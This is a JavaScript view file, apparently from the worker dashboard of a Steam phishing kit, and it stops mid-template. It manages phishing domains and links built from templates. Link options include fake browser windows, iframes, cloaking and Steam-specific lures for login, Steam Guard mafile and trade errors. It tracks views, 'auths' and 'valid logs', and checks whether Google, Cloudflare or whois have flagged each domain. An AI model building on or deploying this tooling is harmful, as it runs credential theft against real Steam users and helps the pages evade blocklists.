window.WorkerViews = window.WorkerViews || {};

WorkerViews.sitesState = {
  selectedId: null,
  filters: { q: "", status: "all" },
};

WorkerViews.sites = async function renderSites(ctx) {
  const { main } = ctx;
  if (WorkerViews.sitesState.selectedId) {
    await renderSiteDetail(main, WorkerViews.sitesState.selectedId, ctx);
    return;
  }
  await renderSitesList(main, ctx);
};

async function renderSitesList(main, ctx) {
  const force = !!ctx?.refresh;
  const data = await WorkerAPI.get("/sites/domains", { force });
  const domains = data.domains || [];
  const filters = WorkerViews.sitesState.filters;

  main.innerHTML = `
    <h1 class="page-greeting">${WorkerI18n.t("sites.pageTitle")}</h1>
    <div class="sites-toolbar">
      <label class="sites-search">
        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="11" cy="11" r="6.5" stroke="currentColor" stroke-width="1.5"/><path d="M16 16l4 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
        <input type="search" id="sitesSearch" value="${WorkerFormat.escapeHtml(filters.q)}" placeholder="${WorkerI18n.t("sites.searchPlaceholder")}" autocomplete="off" />
      </label>
      <div id="sitesStatusFilter" class="custom-select-host sites-filter-select"></div>
      <button type="button" class="btn btn-primary sites-add-btn" id="sitesAddOpen">${WorkerI18n.t("sites.addDomain")}</button>
    </div>
    <div id="sitesGrid" class="sites-grid"></div>
    <dialog class="sites-dialog" id="sitesAddDialog">
      <form method="dialog" class="sites-dialog-body sites-add-body" id="sitesAddForm">
        <h3 class="sites-dialog-title">${WorkerI18n.t("sites.addDomain")}</h3>
        <input class="input" id="sitesDomainInput" placeholder="example.com" autocomplete="off" />
        <div class="muted sites-dialog-hint" id="sitesDomainHint" hidden></div>
        <div class="sites-dialog-actions sites-add-actions">
          <button type="button" class="btn btn-ghost" id="sitesAddCancel">${WorkerI18n.t("sites.cancel")}</button>
          <button type="button" class="btn btn-ghost" id="sitesDomainCheck">${WorkerI18n.t("sites.check")}</button>
          <button type="submit" class="btn btn-primary" id="sitesDomainSubmit">${WorkerI18n.t("sites.add")}</button>
        </div>
      </form>
    </dialog>
  `;

  WorkerDropdown.mount(document.getElementById("sitesStatusFilter"), {
    value: filters.status,
    ariaLabel: WorkerI18n.t("sites.filterStatus"),
    options: [
      { value: "all", label: WorkerI18n.t("sites.filterAll") },
      { value: "active", label: WorkerI18n.t("sites.filterActive") },
      { value: "paused", label: WorkerI18n.t("sites.filterPaused") },
      { value: "own", label: WorkerI18n.t("sites.filterOwn") },
      { value: "team", label: WorkerI18n.t("sites.filterTeam") },
    ],
    onChange: (value) => {
      WorkerViews.sitesState.filters.status = value;
      paintSitesGrid(domains);
    },
  });

  const searchEl = document.getElementById("sitesSearch");
  searchEl.addEventListener("input", () => {
    WorkerViews.sitesState.filters.q = searchEl.value.trim().toLowerCase();
    paintSitesGrid(domains);
  });

  const dialog = document.getElementById("sitesAddDialog");
  const setDomainHint = (text) => {
    const hint = document.getElementById("sitesDomainHint");
    if (!hint) return;
    const value = String(text || "").trim();
    hint.textContent = value;
    hint.hidden = !value;
  };
  document.getElementById("sitesAddOpen").addEventListener("click", () => {
    setDomainHint("");
    dialog.showModal();
  });
  document.getElementById("sitesAddCancel").addEventListener("click", () => dialog.close());
  document.getElementById("sitesDomainCheck").addEventListener("click", async () => {
    try {
      const preview = await WorkerAPI.post("/sites/domains/check", {
        domain: document.getElementById("sitesDomainInput").value.trim(),
      });
      setDomainHint(WorkerI18n.t("sites.checkOk", { ip: preview.ip || "—" }));
    } catch (error) {
      setDomainHint(error.message || WorkerI18n.t("common.error"));
    }
  });
  document.getElementById("sitesAddForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    try {
      const result = await WorkerAPI.post("/sites/domains", {
        domain: document.getElementById("sitesDomainInput").value.trim(),
      });
      dialog.close();
      WorkerViews.sitesState.selectedId = result.created?.id || null;
      if (WorkerViews.sitesState.selectedId) {
        await WorkerViews.sites(ctx);
      } else {
        await renderSitesList(main, ctx);
      }
    } catch (error) {
      setDomainHint(error.message || WorkerI18n.t("common.error"));
    }
  });

  function openDomain(domainId) {
    const id = Number(domainId);
    if (!Number.isFinite(id) || id <= 0) return;
    WorkerViews.sitesState.selectedId = id;
    WorkerViews.sites(ctx).catch((error) => {
      if (window.WorkerToast) WorkerToast.error(error);
    });
  }

  function paintSitesGrid(allDomains) {
    const grid = document.getElementById("sitesGrid");
    const filtered = filterDomains(allDomains, WorkerViews.sitesState.filters);
    if (!filtered.length) {
      grid.innerHTML = `<div class="sites-empty">${WorkerFormat.escapeHtml(WorkerI18n.t("sites.empty"))}</div>`;
      return;
    }
    grid.innerHTML = filtered.map((d) => renderDomainCard(d)).join("");
    grid.querySelectorAll(".site-card[data-domain-id]").forEach((card) => {
      const open = () => openDomain(card.dataset.domainId);
      card.addEventListener("click", (e) => {
        if (e.target.closest(".site-tool-check")) return;
        open();
      });
      card.addEventListener("keydown", (e) => {
        if (e.key !== "Enter" && e.key !== " ") return;
        e.preventDefault();
        open();
      });
    });
  }

  paintSitesGrid(domains);
}

function filterDomains(domains, filters) {
  const q = String(filters.q || "").trim().toLowerCase();
  return (domains || []).filter((d) => {
    if (q && !String(d.domain || "").toLowerCase().includes(q)) return false;
    if (filters.status === "active" && d.isPaused) return false;
    if (filters.status === "paused" && !d.isPaused) return false;
    if (filters.status === "own" && !d.isOwn) return false;
    if (filters.status === "team" && !d.isTeamPublic) return false;
    return true;
  });
}

function banStatusText(type, check) {
  if (!check) return WorkerI18n.t("sites.banUnknown");
  if (check.banned) {
    if (type === "google") return WorkerI18n.t("sites.banGoogleBad");
    if (type === "cloudflare") return WorkerI18n.t("sites.banCloudflareBad");
    return WorkerI18n.t("sites.banWhoisBad");
  }
  if (check.clean) {
    if (type === "google") return WorkerI18n.t("sites.banGoogleOk");
    if (type === "cloudflare") return WorkerI18n.t("sites.banCloudflareOk");
    return WorkerI18n.t("sites.banWhoisOk");
  }
  return WorkerI18n.t("sites.banUnknown");
}

function renderBanTooltip(type, banChecks) {
  const check = banChecks?.[type];
  const statusText = banStatusText(type, check);
  const checkedAt = WorkerFormat.checkDateTime(banChecks?.updatedAt);
  return `
    <div class="site-check-tip" role="tooltip">
      <div class="site-check-tip-row">
        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M4 12h2l2-5 4 10 2-5h6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
        <span class="site-check-tip-body">
          <span class="site-check-tip-label">${WorkerFormat.escapeHtml(WorkerI18n.t("sites.banStatus"))}</span>
          <span class="site-check-tip-value">${WorkerFormat.escapeHtml(statusText)}</span>
        </span>
      </div>
      <div class="site-check-tip-row">
        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="4" y="5" width="16" height="15" rx="2" stroke="currentColor" stroke-width="1.5"/><path d="M8 3v4M16 3v4M4 10h16" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
        <span class="site-check-tip-body">
          <span class="site-check-tip-label">${WorkerFormat.escapeHtml(WorkerI18n.t("sites.banChecked"))}</span>
          <span class="site-check-tip-value">${WorkerFormat.escapeHtml(checkedAt)}</span>
        </span>
      </div>
    </div>
  `;
}

const SITE_STAT_ICONS = {
  views:
    '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M2.5 12s3.5-6.5 9.5-6.5S21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12Z" stroke="currentColor" stroke-width="1.5"/><circle cx="12" cy="12" r="2.8" stroke="currentColor" stroke-width="1.5"/></svg>',
  clicks:
    '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 4.5v6.2M9 10.7 5.8 19.2a1 1 0 0 0 1.3 1.3L10.4 17l2.1 3.4a1 1 0 0 0 1.8-.3L17.2 8.2a1.2 1.2 0 0 0-1.5-1.5L9 10.7Z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></svg>',
  auths:
    '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3.5 19 7v5.2c0 4.2-2.8 7.1-7 8.3-4.2-1.2-7-4.1-7-8.3V7l7-3.5Z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/><path d="m9.2 12 1.9 1.9 3.7-3.8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>',
  logs:
    '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M7 3.5h6.2L17.5 8v11.5A1.5 1.5 0 0 1 16 21H7a1.5 1.5 0 0 1-1.5-1.5v-15A1.5 1.5 0 0 1 7 3.5Z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/><path d="M13.2 3.5V8H17.5M9 12.2h6M9 15.4h4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>',
  online:
    '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M5.5 12a6.5 6.5 0 0 1 13 0" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M8.2 12a3.8 3.8 0 0 1 7.6 0" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><circle cx="12" cy="12" r="1.4" fill="currentColor"/></svg>',
  links:
    '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M10 14a5 5 0 0 1 0-7l1-1a5 5 0 0 1 7 7l-1 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M14 10a5 5 0 0 1 0 7l-1 1a5 5 0 0 1-7-7l1-1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>',
};

function renderMiniStat(label, value, iconKey) {
  const icon = SITE_STAT_ICONS[iconKey] || SITE_STAT_ICONS.views;
  return `
    <div class="site-mini-stat">
      <span class="site-mini-stat-icon" aria-hidden="true">${icon}</span>
      <div class="site-mini-stat-body">
        <span class="site-mini-stat-val">${value}</span>
        <span class="site-mini-stat-lbl">${WorkerFormat.escapeHtml(label)}</span>
      </div>
    </div>
  `;
}

function renderDomainCard(domain) {
  const stats = domain.stats || {};
  const banChecks = domain.banChecks || {};
  const badges = [];
  if (domain.isPaused) {
    badges.push(`<span class="site-badge site-badge-paused">${WorkerI18n.t("sites.paused")}</span>`);
  }

  const hasLinks = Number(domain.linksCount || 0) > 0;
  const actionLabel = hasLinks ? WorkerI18n.t("sites.openLinks") : WorkerI18n.t("sites.createLink");
  const googleBanned = banChecks.google?.banned;
  const whoisBanned = banChecks.whois?.banned;
  const cfBanned = banChecks.cloudflare?.banned;

  return `
    <article class="site-card${domain.isPaused ? " is-paused" : ""}" data-domain-id="${domain.id}" tabindex="0" role="button">
      <div class="site-card-head">
        <div class="site-card-id">
          <div class="site-card-title-row">
            <span class="site-card-status${domain.isPaused ? " is-off" : " is-on"}" title="${domain.isPaused ? WorkerI18n.t("sites.paused") : WorkerI18n.t("sites.filterActive")}"></span>
            <h3 class="site-card-title" title="${WorkerFormat.escapeHtml(domain.domain)}">${WorkerFormat.escapeHtml(domain.domain)}</h3>
          </div>
          <div class="site-card-badges">${badges.join("")}</div>
        </div>
        <div class="site-card-tools">
          <span class="site-tool site-tool-count" title="${WorkerI18n.t("sites.linksCount")}">
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M10 14a5 5 0 0 1 0-7l1-1a5 5 0 0 1 7 7l-1 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><path d="M14 10a5 5 0 0 1 0 7l-1 1a5 5 0 0 1-7-7l1-1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
            <span>${domain.linksCount || 0}</span>
          </span>
          <button type="button" class="site-tool site-tool-check${whoisBanned ? " is-banned" : " is-ok"}" aria-label="Whois">
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3.5 19.5 7v5.4c0 4.4-3 7.5-7.5 8.6-4.5-1.1-7.5-4.2-7.5-8.6V7L12 3.5Z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/><path d="M12 11v5M12 8.2h.01" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
            ${renderBanTooltip("whois", banChecks)}
          </button>
          <button type="button" class="site-tool site-tool-check${cfBanned ? " is-banned" : " is-ok"}" aria-label="Cloudflare">
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M7.2 16.2h10.4c1.4 0 2.4-1 2.2-2.3-.3-1.8-1.9-3.1-3.8-3.1-.4 0-.8.1-1.2.2A4.4 4.4 0 0 0 10.6 8a4.5 4.5 0 0 0-4.3 3.3A3.3 3.3 0 0 0 4 14.4c0 1 .8 1.8 1.8 1.8h1.4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
            ${renderBanTooltip("cloudflare", banChecks)}
          </button>
          <button type="button" class="site-tool site-tool-check site-tool-google${googleBanned ? " is-banned" : " is-ok"}" aria-label="Google">
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12.2 11.2v2.7h4.3c-.2 1.2-1.5 3.5-4.3 3.5A4.9 4.9 0 1 1 12.2 7c1.3 0 2.5.5 3.4 1.3l2.3-2.2A8.2 8.2 0 1 0 12.2 20.2c4.7 0 7.8-3.3 7.8-8 0-.5 0-.9-.1-1.3h-7.7Z" fill="currentColor"/></svg>
            ${renderBanTooltip("google", banChecks)}
          </button>
        </div>
      </div>
      <div class="site-card-kpi">
        ${renderMiniStat(WorkerI18n.t("sites.views"), stats.views || 0, "views")}
        ${renderMiniStat(WorkerI18n.t("sites.clicks"), stats.clicks || 0, "clicks")}
        ${renderMiniStat(WorkerI18n.t("sites.auths"), stats.auths || 0, "auths")}
        ${renderMiniStat(WorkerI18n.t("sites.validLogs"), stats.logs || 0, "logs")}
      </div>
      <div class="site-card-foot">
        <span class="site-card-date">
          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="4" y="5.5" width="16" height="13" rx="2" stroke="currentColor" stroke-width="1.5"/><path d="M8 3.5v4M16 3.5v4M4 9.5h16" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
          ${WorkerFormat.escapeHtml(WorkerFormat.shortDayTime(domain.createdAt))}
        </span>
        <button type="button" class="site-card-go" data-open-domain="${domain.id}">
          ${WorkerFormat.escapeHtml(actionLabel)}
          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
      </div>
    </article>
  `;
}

function windowTypeLabel(type) {
  const key = {
    FakeWindow: "sites.windowFakeWindow",
    CurrentWindow: "sites.windowCurrentWindow",
    NewWindow: "sites.windowNewWindow",
    AboutBlank: "sites.windowAboutBlank",
  }[type];
  return key ? WorkerI18n.t(key) : type || "—";
}

function renderDomainBadges(domain) {
  const badges = [];
  if (domain.isPaused) {
    badges.push(`<span class="site-badge site-badge-paused">${WorkerI18n.t("sites.paused")}</span>`);
  }
  return badges.join("");
}

function linkDisplayUrl(link, domainName) {
  const raw = String(link?.url || link?.link || "").trim();
  if (raw) return raw.startsWith("http") ? raw : `https://${raw.replace(/^\/+/, "")}`;
  const path = String(link?.path || "").replace(/^\/+/, "");
  const host = String(domainName || "").replace(/^https?:\/\//, "").replace(/\/+$/, "");
  if (!host) return path ? `/${path}` : "—";
  return path ? `https://${host}/${path}` : `https://${host}/`;
}

function renderBindMeta(domain) {
  if (domain.bindType === "cloudflare" && (domain.bindNs || []).length) {
    return (domain.bindNs || [])
      .slice(0, 2)
      .map(
        (ns, i) =>
          `<span class="site-bind-chip"><span class="muted">NS${i + 1}</span> ${WorkerFormat.escapeHtml(ns)}</span>`
      )
      .join("");
  }
  return `<span class="site-bind-chip"><span class="muted">IP</span> ${WorkerFormat.escapeHtml(domain.ip || "—")}</span>`;
}

function renderLinkRow(link, domainName) {
  if (!link || typeof link !== "object") return "";
  const url = linkDisplayUrl(link, domainName);
  const stats = link.stats || {};
  const flags = [];
  if (link.isPaused) flags.push(`<span class="site-flag site-flag-warn">${WorkerI18n.t("sites.linkPaused")}</span>`);
  if (link.iframe) flags.push(`<span class="site-flag">${WorkerI18n.t("sites.badgeIframe")}</span>`);

  return `
    <tr data-link-id="${link.id}">
      <td>
        <a class="site-link-url" href="${WorkerFormat.escapeHtml(url || "#")}" target="_blank" rel="noopener noreferrer">${WorkerFormat.escapeHtml(url || "—")}</a>
        <div class="site-link-sub muted">${WorkerFormat.escapeHtml(link.templateName || link.template || "—")}${link.id ? ` · #${link.id}` : ""}</div>
        ${flags.length ? `<div class="site-link-flags">${flags.join("")}</div>` : ""}
      </td>
      <td class="muted">${WorkerFormat.escapeHtml(windowTypeLabel(link.windowType))}</td>
      <td class="td-num">${stats.views || 0}</td>
      <td class="td-num">${stats.auths || 0}</td>
      <td class="td-num">${stats.logs || 0}</td>
      <td class="site-link-actions"><div class="link-actions-host"></div></td>
    </tr>
  `;
}

let openLinkActionsMenu = null;

function closeLinkActionsMenu() {
  if (!openLinkActionsMenu) return;
  openLinkActionsMenu.remove();
  openLinkActionsMenu = null;
}

document.addEventListener("click", () => closeLinkActionsMenu());
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") closeLinkActionsMenu();
});

function mountLinkActionsMenu(host, link, handlers, { domainPaused = false } = {}) {
  if (!host) return;
  host.innerHTML = `
    <button type="button" class="link-actions-btn" aria-label="Actions">
      <svg viewBox="0 0 24 24" fill="none"><circle cx="6" cy="12" r="1.5" fill="currentColor"/><circle cx="12" cy="12" r="1.5" fill="currentColor"/><circle cx="18" cy="12" r="1.5" fill="currentColor"/></svg>
    </button>
  `;
  host.querySelector(".link-actions-btn").addEventListener("click", (e) => {
    e.stopPropagation();
    closeLinkActionsMenu();
    const btn = e.currentTarget;
    const rect = btn.getBoundingClientRect();
    const menu = document.createElement("div");
    menu.className = "link-actions-menu";
    menu.innerHTML = domainPaused
      ? `<button type="button" data-act="delete" class="is-danger">${WorkerI18n.t("sites.actionDelete")}</button>`
      : `
      <button type="button" data-act="edit">${WorkerI18n.t("sites.actionEdit")}</button>
      <button type="button" data-act="delete" class="is-danger">${WorkerI18n.t("sites.actionDelete")}</button>
    `;
    menu.style.top = `${rect.bottom + 4}px`;
    menu.style.left = `${Math.max(8, rect.right - 160)}px`;
    document.body.appendChild(menu);
    openLinkActionsMenu = menu;
    menu.addEventListener("click", (ev) => ev.stopPropagation());
    if (!domainPaused) {
      menu.querySelector('[data-act="edit"]').addEventListener("click", () => {
        closeLinkActionsMenu();
        handlers.onEdit(link);
      });
    }
    menu.querySelector('[data-act="delete"]').addEventListener("click", () => {
      closeLinkActionsMenu();
      handlers.onDelete(link);
    });
  });
}

function linkFormDefaults(templates = []) {
  return {
    mode: "create",
    linkId: null,
    tab: "main",
    templateId: templates[0]?.id ? String(templates[0].id) : "",
    templateName: templates[0]?.name || "",
    windowType: "FakeWindow",
    iframe: true,
    cloaking: false,
    logError: true,
    mafileError: false,
    mafileSteamRedirect: true,
    tradeError: true,
  };
}

function applyLinkToFormState(link, state) {
  state.templateId = link.template ? String(link.template) : "";
  state.templateName = link.templateName || "";
  state.windowType = link.windowType || "FakeWindow";
  state.iframe = link.iframe !== false;
  state.cloaking = Boolean(link.cloaking);
  state.logError = link.steam?.logError !== false;
  state.mafileError = Boolean(link.steam?.mafileError);
  state.mafileSteamRedirect = link.steam?.mafileSteamRedirect !== false;
  state.tradeError = link.steam?.tradeError !== false;
}

function syncLinkFormUi(state, { windowSelect } = {}) {
  const title = document.getElementById("linkFormTitle");
  const submit = document.getElementById("linkFormSubmit");
  if (title) {
    title.textContent =
      state.mode === "edit"
        ? WorkerI18n.t("sites.linkEditTitle")
        : WorkerI18n.t("sites.linkCreateTitle");
  }
  if (submit) {
    submit.textContent =
      state.mode === "edit" ? WorkerI18n.t("sites.submitSave") : WorkerI18n.t("sites.submitAdd");
  }
  const templateEl = document.getElementById("linkTemplateValue");
  if (templateEl) {
    templateEl.textContent =
      state.templateName ||
      (state.templateId ? `#${state.templateId}` : WorkerI18n.t("sites.templateNotSelected"));
  }
  if (windowSelect?.setValue) windowSelect.setValue(state.windowType);
  const pathEl = document.getElementById("linkPathInput");
  if (pathEl && state._path != null) pathEl.value = state._path;

  const iframeEl = document.getElementById("linkOptIframe");
  const cloakingEl = document.getElementById("linkOptCloaking");
  if (iframeEl) iframeEl.checked = state.iframe;
  if (cloakingEl) cloakingEl.checked = state.cloaking;

  const logVal = state.logError ? "error" : "redirect";
  const mafileVal = state.mafileError ? "error" : "redirect";
  const tradeVal = state.tradeError ? "error" : "redirect";
  document.querySelectorAll('input[name="logAction"]').forEach((el) => {
    el.checked = el.value === logVal;
  });
  document.querySelectorAll('input[name="mafileAction"]').forEach((el) => {
    el.checked = el.value === mafileVal;
  });
  document.querySelectorAll('input[name="tradeAction"]').forEach((el) => {
    el.checked = el.value === tradeVal;
  });
}

function mountLinkFormModal({ templates, domainId, domainPaused = false, onSaved }) {
  const state = linkFormDefaults(templates);
  const dialog = document.getElementById("linkFormDialog");
  const templateDialog = document.getElementById("templatePickDialog");
  let windowSelect = null;
  const windowHost = document.getElementById("linkWindowSelect");

  function ensureWindowSelectMounted() {
    if (!windowHost) return;
    if (windowHost.dataset.mounted === "1") return;
    windowHost.dataset.mounted = "1";
    windowSelect = WorkerDropdown.mount(windowHost, {
      value: state.windowType,
      ariaLabel: WorkerI18n.t("sites.windowLabel"),
      options: [
        { value: "FakeWindow", label: WorkerI18n.t("sites.windowFakeWindow") },
        { value: "CurrentWindow", label: WorkerI18n.t("sites.windowCurrentWindow") },
        { value: "NewWindow", label: WorkerI18n.t("sites.windowNewWindow") },
        { value: "AboutBlank", label: WorkerI18n.t("sites.windowAboutBlank") },
      ],
      onChange: (value) => {
        state.windowType = value;
      },
    });
  }

  function paintTabs() {
    dialog.querySelectorAll("[data-link-tab]").forEach((btn) => {
      btn.classList.toggle("is-active", btn.dataset.linkTab === state.tab);
    });
    dialog.querySelectorAll("[data-link-panel]").forEach((panel) => {
      panel.hidden = panel.dataset.linkPanel !== state.tab;
    });
  }

  function openCreate() {
    Object.assign(state, linkFormDefaults(templates));
    state.mode = "create";
    state.linkId = null;
    state._path = "";
    paintTabs();
    syncLinkFormUi(state, { windowSelect });
    dialog.showModal();
    // Dropdown позиционируется через getBoundingClientRect().
    // Монтируем после открытия диалога, чтобы координаты были корректные.
    setTimeout(() => {
      ensureWindowSelectMounted();
      syncLinkFormUi(state, { windowSelect });
    }, 0);
  }

  function openEdit(link) {
    Object.assign(state, linkFormDefaults(templates));
    state.mode = "edit";
    state.linkId = link.id;
    state._path = String(link.path || "").replace(/^\/+/, "");
    applyLinkToFormState(link, state);
    paintTabs();
    syncLinkFormUi(state, { windowSelect });
    dialog.showModal();
    setTimeout(() => {
      ensureWindowSelectMounted();
      syncLinkFormUi(state, { windowSelect });
    }, 0);
  }

  async function submit() {
    if (!state.templateId) {
      alert(WorkerI18n.t("sites.templateNotSelected"));
      return;
    }
    const payload = {
      path: document.getElementById("linkPathInput").value.trim(),
      templateId: state.templateId,
      windowType: state.windowType,
      iframe: state.iframe,
      cloaking: state.cloaking,
      logError: state.logError,
      mafileError: state.mafileError,
      mafileSteamRedirect: state.mafileSteamRedirect,
      tradeError: state.tradeError,
    };
    try {
      if (state.mode === "edit") {
        await WorkerAPI.patch(`/sites/domains/${domainId}/links/${state.linkId}`, payload);
      } else {
        await WorkerAPI.post(`/sites/domains/${domainId}/links`, payload);
      }
      dialog.close();
      await onSaved();
    } catch (error) {
      alert(error.message || WorkerI18n.t("common.error"));
    }
  }

  dialog.querySelectorAll("[data-link-tab]").forEach((btn) => {
    btn.addEventListener("click", () => {
      state.tab = btn.dataset.linkTab;
      paintTabs();
    });
  });

  document.getElementById("linkFormCancel")?.addEventListener("click", () => dialog.close());
  document.getElementById("linkFormSubmit")?.addEventListener("click", submit);
  dialog.addEventListener("close", () => WorkerDropdown.close());

  document.getElementById("linkTemplateOpen")?.addEventListener("click", () => {
    templateDialog.showModal();
    paintTemplateGrid(templates, state, () => {
      syncLinkFormUi(state, { windowSelect });
      templateDialog.close();
    });
  });

  // windowHost dropdown mounted lazily after dialog.showModal()

  document.getElementById("linkOptIframe")?.addEventListener("change", (e) => {
    state.iframe = e.target.checked;
  });
  document.getElementById("linkOptCloaking")?.addEventListener("change", (e) => {
    state.cloaking = e.target.checked;
  });
  dialog.querySelectorAll('input[name="logAction"]').forEach((input) => {
    input.addEventListener("change", () => {
      state.logError = input.value === "error";
    });
  });
  dialog.querySelectorAll('input[name="mafileAction"]').forEach((input) => {
    input.addEventListener("change", () => {
      if (input.value === "error") {
        state.mafileError = true;
        state.mafileSteamRedirect = false;
      } else {
        state.mafileError = false;
        state.mafileSteamRedirect = true;
      }
    });
  });
  dialog.querySelectorAll('input[name="tradeAction"]').forEach((input) => {
    input.addEventListener("change", () => {
      state.tradeError = input.value === "error";
    });
  });

  return { openCreate, openEdit };
}

function paintTemplateGrid(templates, state, onSelect) {
  const grid = document.getElementById("templatePickGrid");
  const search = document.getElementById("templatePickSearch");
  const selectBtn = document.getElementById("templatePickSelect");
  const backBtn = document.getElementById("templatePickBack");
  if (!grid) return;

  let selectedId = state.templateId;

  function render(filter = "") {
    const q = filter.trim().toLowerCase();
    const rows = (templates || []).filter((t) => {
      const name = String(t.name || "").toLowerCase();
      const id = String(t.id || "");
      return !q || name.includes(q) || id.includes(q);
    });
    grid.innerHTML = rows.length
      ? rows
          .map(
            (t) => `
          <button type="button" class="template-row${String(selectedId) === String(t.id) ? " is-selected" : ""}" data-template-id="${t.id}">
            <span class="template-row-id">${t.id}</span>
            <span class="template-row-name">${WorkerFormat.escapeHtml(t.name || `Template #${t.id}`)}</span>
          </button>`
          )
          .join("")
      : `<div class="sites-empty">${WorkerFormat.escapeHtml(WorkerI18n.t("sites.noTemplates"))}</div>`;

    grid.querySelectorAll("[data-template-id]").forEach((btn) => {
      btn.addEventListener("click", () => {
        selectedId = btn.dataset.templateId;
        grid.querySelectorAll(".template-row").forEach((row) => {
          row.classList.toggle("is-selected", row.dataset.templateId === selectedId);
        });
      });
      btn.addEventListener("dblclick", () => {
        selectedId = btn.dataset.templateId;
        const picked = (templates || []).find((t) => String(t.id) === String(selectedId));
        if (!picked) return;
        state.templateId = String(picked.id);
        state.templateName = picked.name || "";
        onSelect();
      });
    });
  }

  if (search) {
    search.value = "";
    search.oninput = () => render(search.value);
  }

  selectBtn.onclick = () => {
    const picked = (templates || []).find((t) => String(t.id) === String(selectedId));
    if (!picked) return;
    state.templateId = String(picked.id);
    state.templateName = picked.name || "";
    onSelect();
  };

  backBtn.onclick = () => document.getElementById("templatePickDialog")?.close();

  render("");
}

async function renderSiteDetail(main, domainId, ctx) {
  const force = !!ctx?.refresh;
  let detail;
  let templatesData = { templates: [] };
  try {
    [detail, templatesData] = await Promise.all([
      WorkerAPI.get(`/sites/domains/${domainId}`, { force }),
      WorkerAPI.get("/sites/templates", { force: false }).catch(() => ({ templates: [] })),
    ]);
  } catch (error) {
    if (window.WorkerToast) WorkerToast.error(error);
    WorkerViews.sitesState.selectedId = null;
    await renderSitesList(main, ctx);
    return;
  }
  if (!detail?.domain) {
    if (window.WorkerToast) {
      WorkerToast.error(WorkerI18n.t("toast.notFound"));
    }
    WorkerViews.sitesState.selectedId = null;
    await renderSitesList(main, ctx);
    return;
  }
  const d = detail.domain;
  const domainPaused = Boolean(d.isPaused);
  const templates = templatesData?.templates || [];
  const links = (Array.isArray(detail.links) ? detail.links : []).filter(
    (link) => link && typeof link === "object"
  );
  const stats = d.stats || {};
  const banChecks = d.banChecks || {};
  const googleBanned = banChecks.google?.banned;

  try {
    main.innerHTML = `
    <nav class="sites-breadcrumb-line">
      <button type="button" class="sites-crumb-btn" id="sitesBack">${WorkerI18n.t("sites.breadcrumbSites")}</button>
      <span class="sites-crumb-sep">›</span>
      <span class="sites-crumb-current">${WorkerFormat.escapeHtml(d.domain)}</span>
    </nav>
    <h1 class="page-greeting"><em>${WorkerFormat.escapeHtml(d.domain)}</em></h1>

    <section class="section">
      <div class="section-head">
        <h2 class="section-title">${WorkerI18n.t("sites.domainOverview")}</h2>
        <div class="site-head-badges">
          ${renderDomainBadges(d)}
          <div class="site-card-tools site-head-tools">
            <button type="button" class="site-tool site-tool-check${banChecks.whois?.banned ? " is-banned" : ""}" aria-label="Whois">
              <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="8" stroke="currentColor" stroke-width="1.5"/><path d="M2 12h20M12 2a15 15 0 0 1 0 20M12 2a15 15 0 0 0 0 20" stroke="currentColor" stroke-width="1.5"/></svg>
              ${renderBanTooltip("whois", banChecks)}
            </button>
            <button type="button" class="site-tool site-tool-check${banChecks.cloudflare?.banned ? " is-banned" : ""}" aria-label="Cloudflare">
              <svg viewBox="0 0 24 24" fill="none"><path d="M7 16h10l1-2.5H6.5L7 16Z" fill="currentColor" opacity=".35"/><path d="M8 13.5h9.5c.5-2.5-1-4.5-3.5-4.5-1.5 0-2.8.8-3.5 2.1C10.2 9.8 8.5 9 7 9.5 5.2 10.1 4 11.7 4 13.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
              ${renderBanTooltip("cloudflare", banChecks)}
            </button>
            <button type="button" class="site-tool site-tool-check site-tool-google${googleBanned ? " is-banned" : ""}" aria-label="Google">
              <span class="site-tool-g">G</span>
              ${renderBanTooltip("google", banChecks)}
            </button>
          </div>
        </div>
      </div>
      <div class="site-domain-kpi">
        ${renderMiniStat(WorkerI18n.t("sites.onlineLabel"), d.online || 0, "online")}
        ${renderMiniStat(WorkerI18n.t("sites.linksCount"), links.length, "links")}
